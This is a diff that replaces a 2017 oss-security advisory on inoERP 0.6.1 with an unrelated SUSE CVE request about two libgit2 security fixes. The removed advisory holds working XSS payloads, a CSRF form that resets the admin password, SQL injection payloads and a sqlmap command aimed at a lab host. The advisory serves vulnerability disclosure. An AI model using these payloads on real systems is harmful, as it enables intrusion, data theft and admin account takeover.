@@ -1,186 +1,59 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/03/27/1
-Message-ID: <080d168b-239a-4ce0-4eae-507722e8b1ce@foxmole.com>
-Date: Mon, 27 Mar 2017 10:02:10 +0200
-From: FOXMOLE Advisories <advisories@...mole.com>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/01/10/5
+Message-ID: <8c1cd983-c3ec-c821-0e11-b8dd6bed1387@suse.com>
+Date: Tue, 10 Jan 2017 11:31:37 +0100
+From: Andreas Stieger <astieger@...e.com>
 To: oss-security@...ts.openwall.com
-Subject: inoERP - Multiple Issues
+Cc: cve-assign@...re.org, cmn@...m.me
+Subject: CVE Request: two security fixes in libgit2 0.25.1, 0.24.6
 Content-Type: text/plain; charset=utf-8
 
------BEGIN PGP SIGNED MESSAGE-----
-Hash: SHA256
+Hello,
 
-=== FOXMOLE - Security Advisory 2017-01-25 ===
+libgit2 released:
 
-inoERP  - Multiple Issues
-~~~~~~~~~~~~~~~~~~~~~~~~~
+https://github.com/libgit2/libgit2/releases/tag/v0.25.1
+https://github.com/libgit2/libgit2/releases/tag/v0.24.6
 
-Affected Versions
-=================
-inoERP 0.6.1
+with the following two fixes:
 
-Issue Overview
-==============
-Vulnerability Type: SQL Injection, Cross Site Scripting, Cross Site Request Forgery, Session Fixation
-Technical Risk: critical
-Likelihood of Exploitation: medium
-Vendor: inoERP
-Vendor URL: http://inoideas.org/  /  https://github.com/inoerp/inoERP
-Credits: FOXMOLE employee Tim Herres
-Advisory URL: https://www.foxmole.com/advisories/foxmole-2017-01-25.txt
-Advisory Status: Public
-OVE-ID: OVE-20170126-0002
-CVSS 2.0: 10.0 (AV:N/AC:L/Au:N/C:C/I:C/A:C)
+[...] performs extra sanitization for some edge cases in the Git Smart
+Protocol which can lead to attempting to parse outside of the buffer.
+
+https://github.com/libgit2/libgit2/commit/66e3774d279672ee51c3b54545a79d20d1ada834
+https://github.com/libgit2/libgit2/commit/2fdef641fd0dd2828bd948234ae86de75221a11a
 
 
-Impact
-======
-There are multiple SQL Injection vulnerabilities, exploitable without authentication.
-An attacker could use the SQL Injection to access the database in an unsafe way.
-This means there is a high impact to all applications.
-The inoERP software also lacks in input validation resulting in different reflected/stored XSS vulnerabilities.
+[...] fix affects the certificate check callback. It provides a valid
+parameter to indicate whether the native cryptographic library
+considered the certificate to be correct. This parameter is always
+1/true before this fix leading to a possible MITM.
+
+This does not affect you if you do not use the custom certificate
+callback or if you do not take this value into account. This does affect
+you if you use pygit2 or git2go regardless of whether you specify a
+certificate check callback.
+
+https://github.com/libgit2/libgit2/commit/9a64e62f0f20c9cf9b2e1609f037060eb2d8eb22
+https://github.com/libgit2/libgit2/commit/98d66240ecb7765e191da19b535c75c92ccc90fe
+https://github.com/libgit2/libgit2/commit/3829ba2e710553893faf6336cc6b2f3fc17a293e
+https://github.com/libgit2/libgit2/commit/2ac57aa89bde788173b54bd153430369deec64c0
 
 
-Issue Description
-=================
-The following findings are only examples, there are quite more. The whole application should be reviewed.
+Could CVEs please be assigned?
 
-All items tested using FF52.
+Thanks,
 
-1.) Cross Site Scripting:
-Stored:
-Create a new Question in the -->Forum --> Ask a question
-Vulnerable fields : Title, Content
-Used Payload: Test<script>alert("xss")</script>
+Andreas
 
-Response:
-[...]
- <title>Test<script>alert("xss")</script> - inoERP!</title>
-[...]
+-- 
 
-The latest questions are included in the start page which means the entered payload gets executed directly in the start page.
-
-Reflected:
-With Auth:
-http://192.168.241.143/inoerp/form.php?class_name=%3CscRipt%3Ealert(%22xss%22)%3C%2fscRipt%3E&mode=9&user_id=7
-http://192.168.241.143/inoerp/includes/json/json_blank_search.php?class_name=content&content_type_id=49&window_type=%22%3C/scRipt%3E%3CscRipt%3Ealert(%22xss%22)
-%3C/scRipt%3E
-http://192.168.241.143/inoerp/program.php?class_name=%3CscRipt%3Ealert(%22xss%22)%3C%2fscRipt%3E&program_name=prg_all_combinations&program_type=download_report
-
-Unauthenticated:
-http://192.168.241.143/inoerp/index.php/'%22--%3E%3C/style%3E%3C/scRipt%3E%3CscRipt%3Ealert(%22xss%22)%3C/scRipt%3E
-
-2.) No protection against Cross Site Request Forgery Attacks:
-PoC: Changing the admin user credentials.
-
-<html>
-<body>
-    <form action="http://<IP>/inoerp/form.php?class_name=user" method="POST">
-      <input type="hidden" name="headerData&#91;0&#93;&#91;name&#93;" value="user&#95;id&#91;&#93;" />
-      <input type="hidden" name="headerData&#91;0&#93;&#91;value&#93;" value="1" />
-      <input type="hidden" name="headerData&#91;1&#93;&#91;name&#93;" value="username&#91;&#93;" />
-      <input type="hidden" name="headerData&#91;1&#93;&#91;value&#93;" value="inoerp" />
-      <input type="hidden" name="headerData&#91;2&#93;&#91;name&#93;" value="enteredPassword&#91;&#93;" />
-      <input type="hidden" name="headerData&#91;2&#93;&#91;value&#93;" value="test" />
-      <input type="hidden" name="headerData&#91;3&#93;&#91;name&#93;" value="enteredRePassword&#91;&#93;" />
-      <input type="hidden" name="headerData&#91;3&#93;&#91;value&#93;" value="test" />
-      <input type="hidden" name="headerData&#91;4&#93;&#91;name&#93;" value="first&#95;name&#91;&#93;" />
-      <input type="hidden" name="headerData&#91;4&#93;&#91;value&#93;" value="inoerp" />
-      <input type="hidden" name="headerData&#91;5&#93;&#91;name&#93;" value="last&#95;name&#91;&#93;" />
-      <input type="hidden" name="headerData&#91;5&#93;&#91;value&#93;" value="inoerp" />
-      <input type="hidden" name="headerData&#91;6&#93;&#91;name&#93;" value="email&#91;&#93;" />
-      <input type="hidden" name="headerData&#91;6&#93;&#91;value&#93;" value="inoerp&#64;no&#45;site&#46;com" />
-      <input type="hidden" name="headerData&#91;7&#93;&#91;name&#93;" value="phone&#91;&#93;" />
-[..snipped...]
-
-If a privileged user activates the request, the admin user id=1 is set to "test".
-
-3.) SQL Injection:
-Auth required:No
-#####
-http://192.168.241.143/inoerp/form.php?
-Parameter: module_code (GET)
-    Type: boolean-based blind
-    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or
-GROUP BY clause
-    Payload: module_code=test' RLIKE (SELECT (CASE WHEN (2838=2838) THEN
-0x74657374 ELSE 0x28 END))-- qkmO
-
-    Type: error-based
-    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or
-GROUP BY clause (FLOOR)
-    Payload: module_code=test' AND (SELECT 8706 FROM(SELECT
-COUNT(*),CONCAT(0x716b7a6271,(SELECT
-(ELT(8706=8706,1))),0x7171626a71,FLOOR(RAND(0)*2))x FROM
-INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- NPEq
-
-    Type: stacked queries
-    Title: MySQL > 5.0.11 stacked queries (comment)
-    Payload: module_code=test';SELECT SLEEP(5)#
-
-    Type: AND/OR time-based blind
-    Title: MySQL >= 5.0.12 OR time-based blind
-    Payload: module_code=test' OR SLEEP(5)-- STgC
-
-Exploitable using e.g. SQLMAP
-
-Blind SQL Injection:
-sqlmap -u
-"http://192.168.241.143/inoerp/content.php?content_type%5b%5d=test&search_text=3&search_document_list%5b%5d=all"
- -p "content_type%5b%5d" --dbms="MySQL"
-Parameter: content_type[] (GET)
-    Type: boolean-based blind
-    Title: OR boolean-based blind - WHERE or HAVING clause
-    Payload: content_type[]=-8366' OR 7798=7798 AND
-'eanR'='eanR&search_text=3&search_document_list[]=all
-
-    Type: AND/OR time-based blind
-    Title: MySQL >= 5.0.12 OR time-based blind
-    Payload: content_type[]=test' OR SLEEP(5) AND
-'exIO'='exIO&search_text=3&search_document_list[]=all
-#####
-
-4.) Session Fixation:
-After a successful login the SessionID PHPSESSID remains the same:
-Before Login: INOERP123123=t4e5ef5kqnv6d1u2uguf7lraa2
-After Login: INOERP123123=t4e5ef5kqnv6d1u2uguf7lraa2
+Andreas Stieger <astieger@...e.com>
+Project Manager Security
+SUSE Linux GmbH, GF: Felix Imendörffer, Jane Smithard, Graham Norton,
+HRB 21284 (AG Nürnberg)
 
 
 
 
-Temporary Workaround and Fix
-============================
-FOXMOLE advises to restrict the access to all vulnerable inoERP systems until all vulnerabilities are fixed.
-
-
-
-History
-=======
-2017-01-25  Issue discovered
-2017-01-26  Vendor contacted -> no response
-2017-02-20  Vendor contacted again -> no response
-2017-03-06  Vendor contacted again -> no response
-2017-03-27  Advisory Release
-
-
-GPG Signature
-=============
-This advisory is signed with the GPG key of the FOXMOLE advisories team.
-The key can be downloaded here: https://www.foxmole.com/advisories-key-3812092199E3277C.asc
-
------BEGIN PGP SIGNATURE-----
-
-iQIzBAEBCAAdFiEEjrQMZqTYqiY2IftqOBIJIZnjJ3wFAljYxwAACgkQOBIJIZnj
-J3w40g//aaMIlMKypKA11BkUVDbyza4B3YyhmOnD2HYCX7ALdca5aSu4GwfQp+Lo
-xS5ZmQOY9IlEBmw7xNlIeK6wHQd2mpOkIv6kzGcBQo5YzRqGN6PIK4XJk/Z7XRUc
-cmObGqmkRSZ7lNDE01EuOkgtRgouSNTbh7qTLh6zwwmfEwyIWsMS5lNq2Reongy7
-QXTt6mlXBttszrvaiELWcKtmVEHRQHHo7Zi8RAec9vt74ANAu9PzpAQnIpkQOQNR
-8rusJkMBn4uFhcLsUxH53UlMg+DCCbfg1Kc7Gly0kYdoirDKuq544nng7pDvfDYg
-e6daWhm7ReL1XEjj3TU/7q1XMfCh/qyiEWeHZGsG/JReA7Rj//DkMTsR6FvTc4Ns
-ZXj1X/zzMdrPGKpki57/0z+/LupySTgDmKtM+q2UFLXSz9dF0YRIUn0uSJ7AH8bu
-xmF8KvIycUSWTPFchsnWO4fL7+d8Z56qqN7RmuF4v/MobHXKOner/4j+z4wxPowt
-wLRNEYnF4gSmaS+LYPmv//vHoyXoJRJBkXqGYFwtGEud+WqUpT35UxBaHbzjCAjM
-yziFzW7XLYkP15i5UP7sdf44eiHdF6D4BZqFHCc1oZkK/NWHtrXRSLBimHkSGYlr
-PNU7T+KRiu9G5hoIbQCja9L1EkIzDg87ZLqsDMvLXYOEmrFrOKs=
-=h4Qx
------END PGP SIGNATURE-----
+Download attachment "signature.asc" of type "application/pgp-signature" (834 bytes)
